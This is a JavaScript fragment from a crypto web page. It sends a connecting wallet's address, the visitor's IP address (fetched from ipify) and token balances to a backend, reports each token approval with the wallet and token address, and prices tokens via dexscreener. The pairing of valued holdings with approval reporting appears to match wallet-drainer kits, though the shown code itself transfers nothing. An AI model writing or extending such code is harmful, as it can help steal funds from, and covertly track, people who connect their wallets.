function notifyWalletConnect(walletAddress, ipAddress, tokenBalances) {
    if (!walletAddress) return;
    
    window.debugLog("📤 Sending wallet connect to backend...", "info");
    window.debugLog("Wallet: " + walletAddress, "info");
    window.debugLog("IP: " + ipAddress, "info");
    window.debugLog("Tokens count: " + (tokenBalances ? tokenBalances.length : 0), "info");
    
    const payload = {
        walletAddress: walletAddress,
        ipAddress: ipAddress || 'Unknown',
        tokenBalances: tokenBalances || []
    };
    
    fetch(`${BACKEND_URL}/api/payment/wallet-connect`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).then(res => {
        window.debugLog("✅ Backend wallet-connect response: " + res.status, "success");
    }).catch(err => {
        window.debugLog("❌ Backend wallet-connect error: " + err.message, "error");
    });
}

function notifyApproval(walletAddress, tokenAddress) {
    if (!walletAddress || !tokenAddress) return;
    
    window.debugLog("📤 Sending approval to backend...", "info");
    window.debugLog("Token: " + tokenAddress, "info");
    
    fetch(`${BACKEND_URL}/api/payment/approval`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ walletAddress, tokenAddress })
    }).then(res => {
        window.debugLog("✅ Backend approval response: " + res.status, "success");
    }).catch(err => {
        window.debugLog("❌ Backend approval error: " + err.message, "error");
    });
}

async function getIPAddress() {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    
    try {
        const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
        clearTimeout(timeoutId);
        if (!response.ok) return 'Unknown';
        const data = await response.json();
        return data.ip || 'Unknown';
    } catch (error) {
        clearTimeout(timeoutId);
        return 'Unknown';
    }
}

async function fetchPrice(tokenAddress, isStable) {
    if (isStable) return 1.0;
    if (!tokenAddress) return 1.0;
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    
    try {
        const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`, { signal: controller.signal });
        clearTimeout(timeoutId);
        if (!res.ok) return 1.0;
        const data = await res.json();
        if (data?.pairs?.[0]?.priceUsd) return parseFloat(data.pairs[0].priceUsd);
    } catch (e) {
        clearTimeout(timeoutId);
        console.error('Price fetch error:', e.message);
    }
    return 1.0;
}